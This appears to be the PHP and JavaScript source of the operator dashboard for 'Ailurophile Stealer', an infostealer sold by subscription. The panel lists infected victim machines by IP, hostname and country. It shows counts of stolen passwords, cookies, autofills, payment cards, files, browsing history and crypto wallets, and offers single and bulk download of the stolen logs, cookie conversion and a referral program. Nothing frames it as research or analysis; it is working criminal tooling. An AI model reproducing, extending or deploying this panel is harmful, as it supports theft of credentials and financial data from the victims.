<!DOCTYPE html>
<html lang="en"> <!--begin::Head-->
<?php
session_start();
include __DIR__."/api/config.php";

if (!isset($_SESSION['user_id'])) {
    header("Location: /login");
    exit();
}

$user_id = $_SESSION['user_id'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($user) {
                $username = $user['username'];
                $role = $user['role'];
            }
if($role=="1"){
	header("Location: subscription");
	exit;
	
}
?>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Ailurophile Stealer | Bot Manager</title><!--begin::Primary Meta Tags-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="title" content="Ailurophile Stealer | Bot Manager">
    <meta name="author" content="Ailurophile Stealer | Bot Manager">
    <meta name="description" content="Ailurophile Stealer | Bot Manager">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/source-sans-3@5.0.12/index.css" integrity="sha256-tXJfXfp6Ewt1ilPzLDtQnJV4hclT9XuaZUKyUvmyr+Q=" crossorigin="anonymous"><!--end::Fonts--><!--begin::Third Party Plugin(OverlayScrollbars)-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@2.3.0/styles/overlayscrollbars.min.css" integrity="sha256-dSokZseQNT08wYEWiz5iLI8QPlKxG+TswNRD8k35cpg=" crossorigin="anonymous"><!--end::Third Party Plugin(OverlayScrollbars)--><!--begin::Third Party Plugin(Bootstrap Icons)-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.min.css" integrity="sha256-Qsx5lrStHZyR9REqhUF8iQt73X06c8LGIUPzpOhwRrI=" crossorigin="anonymous"><!--end::Third Party Plugin(Bootstrap Icons)--><!--begin::Required Plugin(AdminLTE)-->
    <link rel="stylesheet" href="adminlte/css/adminlte.css"><!--end::Required Plugin(AdminLTE)--><!-- apexcharts -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/apexcharts@3.37.1/dist/apexcharts.css" integrity="sha256-4MX+61mt9NVvvuPjUWdUdyfZfxSB1/Rf9WtqRHgG5S0=" crossorigin="anonymous"><!-- jsvectormap -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/css/jsvectormap.min.css" integrity="sha256-+uGLJmmTKOqBr+2E6KDYs/NRsHxSkONXFHUL0fy2O/4=" crossorigin="anonymous">
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Thêm Bootstrap JS nếu cần -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
</head> <!--end::Head--> <!--begin::Body-->

<body class="layout-fixed sidebar-expand-lg bg-body-tertiary"> <!--begin::App Wrapper-->
    <div class="app-wrapper"> <!--begin::Header-->
        <nav class="app-header navbar navbar-expand bg-body"> <!--begin::Container-->
            <div class="container-fluid"> <!--begin::Start Navbar Links-->
                <ul class="navbar-nav">
                    <li class="nav-item"> <a class="nav-link" data-lte-toggle="sidebar" href="#" role="button"> <i class="bi bi-list"></i> </a> </li>
                    <li class="nav-item d-none d-md-block"> <a href="#" class="nav-link">Home</a> </li>
                </ul> <!--end::Start Navbar Links--> <!--begin::End Navbar Links-->
                  </div> <!--end::Container-->
        </nav> <!--end::Header--> <!--begin::Sidebar-->
        <aside class="app-sidebar bg-body-secondary shadow" data-bs-theme="dark"> <!--begin::Sidebar Brand-->
           <div class="sidebar-brand"> <!--begin::Brand Link--> <a href="/dashboard" class="brand-link"> <!--begin::Brand Image--> <img src="cat.png" alt="AdminLTE Logo" class="brand-image opacity-75 shadow"> <!--end::Brand Image--> <!--begin::Brand Text--> <span class="brand-text fw-light"><?php  if($role==2){echo "Standard Member";} elseif($role==3){echo "Premium Member";} elseif($role==4){echo "VIP Member";} else{echo "New Member";}; ?></span> <!--end::Brand Text--> </a> <!--end::Brand Link--> </div> <!--end::Sidebar Brand--> <!--begin::Sidebar Wrapper-->
               <div class="sidebar-wrapper">
                <nav class="mt-2"> <!--begin::Sidebar Menu-->
                 <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
    <li class="nav-item">
        <a href="/dashboard" class="nav-link">
            <i class="nav-icon fas fa-tachometer-alt"></i>
            <p>Dashboard</p>
        </a>
    </li>
		<li class="nav-item">
        <a href="/stats" class="nav-link">
            <i class="nav-icon fas fa-tachometer-alt"></i>
            <p>Stats</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/subscription" class="nav-link">
            <i class="nav-icon fas fa-th"></i>
            <p>Subscription</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/bot" class="nav-link">
            <i class="nav-icon fas fa-robot"></i> <!-- Thay đổi icon -->
            <p>My Bots</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/settings" class="nav-link">
            <i class="nav-icon fas fa-cog"></i>
            <p>Settings</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/cookie" class="nav-link">
            <i class="nav-icon fas fa-cookie"></i> <!-- Thay đổi icon -->
            <p>Convert Cookie</p>
        </a>
    </li>
    <li class="nav-item">
        <a href="/ref" class="nav-link">
            <i class="nav-icon fas fa-users"></i> <!-- Thay đổi icon -->
            <p>Referral Program</p>
        </a>
    </li>
</ul>
      </nav>
            </div> <!--end::Sidebar Wrapper-->
        </aside> <!--end::Sidebar--> <!--begin::App Main-->
        <main class="app-main"> <!--begin::App Content Header-->
            <div class="app-content-header"> <!--begin::Container-->
                <div class="container-fluid"> <!--begin::Row-->
                    <div class="row">
                        <div class="col-sm-6">
                            <h3 class="mb-0">Dashboard</h3>
                        </div>
                        <div class="col-sm-6">
                            <ol class="breadcrumb float-sm-end">
                                <li class="breadcrumb-item"><a href="#">Home</a></li>
                                <li class="breadcrumb-item active" aria-current="page">
                                    Dashboard
                                </li>
                            </ol>
                        </div>
                    </div> <!--end::Row-->
                </div> <!--end::Container-->
            </div> <!--end::App Content Header--> <!--begin::App Content-->
            <div class="app-content"> <!--begin::Container-->
                <div class="container-fluid"> <!--begin::Row-->
                    <div class="row"> <!--begin::Col-->
					
					
<div class="container-fluid pt-4 px-4">
    <div class="card">
        <div class="card-header d-flex align-items-center justify-content-between">
            <h3 class="card-title">Recent Bots</h3>
            <div id="bulkActions" class="d-none">
                <button class="btn btn-success btn-sm" id="bulkDownload" onclick="bulkDownload()">Bulk Download</button>
                <button class="btn btn-danger btn-sm" id="bulkDelete" onclick="bulkDelete()">Bulk Delete</button>
            </div>
        </div>

        <div class="card-body p-0">
            <div class="table-responsive">
                <table class="table table-bordered table-hover">
                    <thead class="bg-secondary text-white">
                        <tr>
                            <th>IP</th>
                            <th>Hostname</th>
                            <th>Country</th>
                            <th>Type</th>
                            <th>Passwords</th>
                            <th>Cookies</th>
                            <th>Autofills</th>
                            <th>Cards</th>
                            <th>Files</th>
                            <th>History</th>
                            <th>Date</th>
                            <th>Wallet</th>
                            <th>Download</th>
                            <th>Select</th> <!-- Checkbox column -->
                        </tr>
                    </thead>
                    <tbody id="botTableBody">
                        <!-- AJAX content will load here -->
                    </tbody>
                </table>
            </div>
        </div>

        <div class="card-footer">
            <nav aria-label="Page navigation example">
                <ul class="pagination justify-content-center mb-0">
                    <li class="page-item">
                        <button class="page-link" onclick="loadBots(1)">1</button>
                    </li>
                    <li class="page-item">
                        <button class="page-link" onclick="loadBots(2)">2</button>
                    </li>
                    <li class="page-item">
                        <button class="page-link" onclick="loadBots(3)">3</button>
                    </li>
                    <li class="page-item">
                        <button class="page-link" onclick="loadBots(4)">4</button>
                    </li>
                    <li class="page-item">
                        <button class="page-link" onclick="loadBots(5)">5</button>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
</div>
				
                                  </div> <!--end::Row--> <!--begin::Row-->
                   </div> <!--end::Container-->
            </div> <!--end::App Content-->
        </main> <!--end::App Main--> <!--begin::Footer-->
         <footer class="app-footer"> <!--begin::To the end-->
            <div class="float-end d-none d-sm-inline"></div> <!--end::To the end--> <!--begin::Copyright--> <strong>
                Ailuriophile Stealer&nbsp;
                <a href="https://t.me/ailurophilevn" class="text-decoration-none">@Ailurophilevn</a>.
            </strong>
            Official Website.
            <!--end::Copyright-->
        </footer> <!--end::Footer-->
    </div> <!--end::App Wrapper--> <!--begin::Script--> <!--begin::Third Party Plugin(OverlayScrollbars)-->
    <script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@2.3.0/browser/overlayscrollbars.browser.es6.min.js" integrity="sha256-H2VM7BKda+v2Z4+DRy69uknwxjyDRhszjXFhsL4gD3w=" crossorigin="anonymous"></script> <!--end::Third Party Plugin(OverlayScrollbars)--><!--begin::Required Plugin(popperjs for Bootstrap 5)-->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha256-whL0tQWoY1Ku1iskqPFvmZ+CHsvmRWx/PIoEvIeWh4I=" crossorigin="anonymous"></script> <!--end::Required Plugin(popperjs for Bootstrap 5)--><!--begin::Required Plugin(Bootstrap 5)-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha256-YMa+wAM6QkVyz999odX7lPRxkoYAan8suedu4k2Zur8=" crossorigin="anonymous"></script> <!--end::Required Plugin(Bootstrap 5)--><!--begin::Required Plugin(AdminLTE)-->
    <script src="adminlte/js/adminlte.js"></script> <!--end::Required Plugin(AdminLTE)--><!--begin::OverlayScrollbars Configure-->
        <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js" integrity="sha256-ipiJrswvAR4VAx/th+6zWsdeYmVae0iJuiR+6OqHJHQ=" crossorigin="anonymous"></script> <!-- sortablejs -->
     <script src="https://cdn.jsdelivr.net/npm/apexcharts@3.37.1/dist/apexcharts.min.js" integrity="sha256-+vh8GkaU7C9/wbSLIcwq82tQ2wTf44aOHA8HlBMwRI8=" crossorigin="anonymous"></script> <!-- ChartJS -->
     <script src="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/js/jsvectormap.min.js" integrity="sha256-/t1nN2956BT869E6H4V1dnt0X5pAQHPytli+1nTZm2Y=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/jsvectormap@1.5.3/dist/maps/world.js" integrity="sha256-XPpPaZlU8S/HWf7FZLAncLg2SAkP8ScUTII89x9D3lY=" crossorigin="anonymous"></script> <!-- jsvectormap -->
  	     <script>
    // Chức năng chọn tất cả
    function toggleSelectAll(selectAllCheckbox) {
        var checkboxes = document.querySelectorAll('input[name="botCheckbox"]');
        checkboxes.forEach(function(checkbox) {
            checkbox.checked = selectAllCheckbox.checked;
        });
        toggleBulkActions();
    }

    // Hiển thị nút bulk actions khi có ít nhất một checkbox được chọn
    function toggleBulkActions() {
        var selected = document.querySelectorAll('input[name="botCheckbox"]:checked').length > 0;
        document.getElementById('bulkActions').style.display = selected ? 'block' : 'none';
    }

    // Hàm để tải bots theo trang
    function loadBots(page) {
        // Hiển thị spinner
        $('#spinner').show();

        $.ajax({
            url: '/api/get_bot.php',
            method: 'GET',
            data: { page: page },
            dataType: 'json'
        })
        .done(function(response) {
            if (response.status === 'success') {
                var bots = response.data;
                var botTableBody = $('#botTableBody');
                botTableBody.empty(); // Xóa nội dung cũ

                // Thêm nội dung mới vào bảng
                bots.forEach(function(bot) {
                    var walletStatus = bot.bot_wallet == 1 ? '<center>✔️</center>' : '<center>❌</center>'; // Kiểm tra giá trị bot_wallet

                    var row = '<tr>' +
                        '<td>' + bot.bot_ip + '</td>' +
                        '<td>' + bot.bot_hostname + '</td>' +
                        '<td>' + bot.bot_country + '</td>' +
                        '<td>' + bot.bot_type + '</td>' +
                        '<td>' + bot.bot_passwords + '</td>' +
                        '<td>' + bot.bot_cookies + '</td>' +
                        '<td>' + bot.bot_autofills + '</td>' +
                        '<td>' + bot.bot_cards + '</td>' +
                        '<td>' + bot.bot_files + '</td>' +
                        '<td>' + bot.bot_history + '</td>' +
                        '<td>' + bot.created_at + '</td>' +
                        '<td>' + walletStatus + '</td>' +
                        '<td><a class="btn btn-sm btn-primary" href="/download?file=' + bot.path_file + '">Download</a></td>' +
                        '<td><input type="checkbox" name="botCheckbox" value="' + bot.id + '" onchange="toggleBulkActions()"></td>' + // Checkbox chọn bot
                        '</tr>';
                    botTableBody.append(row);
                });
            } else {
                alert(response.message);
            }
        })
        .fail(function() {
            alert('Error loading bots.');
        })
        .always(function() {
            // Ẩn spinner sau khi hoàn tất xử lý
            $('#spinner').hide();
        });
    }

    // Bulk download function
function bulkDownload() {
    var selectedBots = [];
    $('input[name="botCheckbox"]:checked').each(function() {
        selectedBots.push($(this).val());
    });

    if (selectedBots.length === 0) {
        alert('Please select at least one bot.');
        return;
    }

    $.ajax({
        url: '/api/bulk_download.php',
        method: 'POST',
        data: { bots: selectedBots.join(',') },
        success: function(response) {
            // Đảm bảo phản hồi là JSON và kiểm tra status
            if (response.status === 'success') {
                // Hiển thị modal thông báo sau khi request thành công
                var modalContent = 'Download bulk logs at <a href="/download?file=' + response.message + '">' + response.message + '</a>';
                $('#modalBody').html(modalContent);
                $('#successModal').modal('show'); // Hiển thị modal
            } else if (response.status === 'error') {
                alert('Error: ' + response.message);
            } else {
                alert('Unexpected response format.');
            }
        },
        error: function() {
            alert('Error while downloading the selected bots.');
        }
    });
}

    // Bulk delete function
    function bulkDelete() {
        var selectedBots = [];
        $('input[name="botCheckbox"]:checked').each(function() {
            selectedBots.push($(this).val());
        });

        if (selectedBots.length === 0) {
            alert('Please select at least one bot.');
            return;
        }

        if (!confirm('Are you sure you want to delete the selected bots?')) {
            return;
        }

        // Gửi yêu cầu AJAX để xóa bots
        $.ajax({
            url: '/api/bulk_delete.php',
            method: 'POST',
            data: { bots: selectedBots },
            dataType: 'json',
            success: function(response) {
                if (response.status === 'success') {
                    alert('Selected bots have been deleted.');
                    loadBots(1); // Tải lại dữ liệu sau khi xóa
                } else {
                    alert(response.message);
                }
            },
            error: function() {
                alert('Error deleting bots.');
            }
        });
    }

    // Tải trang đầu tiên khi trang được tải
    $(document).ready(function() {
        loadBots(1);
    });
</script>

</html>